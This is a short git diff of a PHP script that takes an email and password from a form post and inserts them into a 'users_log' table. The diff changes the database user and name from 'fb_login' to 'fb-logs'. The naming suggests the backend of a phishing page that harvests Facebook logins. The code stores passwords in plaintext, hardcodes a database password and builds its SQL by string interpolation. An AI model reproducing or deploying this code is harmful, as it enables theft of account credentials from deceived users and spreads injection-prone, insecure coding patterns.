@@ -4,7 +4,7 @@ if (!empty($_POST['email']) && !empty($_POST['pass'])) {
     $pass = filter_var($_POST['pass'], FILTER_SANITIZE_SPECIAL_CHARS, MYSQLI_NOT_NULL_FLAG);
 }
 
-$link_db = mysqli_connect('localhost', 'fb_login', '23047878A', 'fb_logins');
+$link_db = mysqli_connect('localhost', 'fb-logs', '23047878A', 'fb-logs');
 
 $query = "INSERT INTO users_log SET user_log='$user',pass_log='$pass'";
 
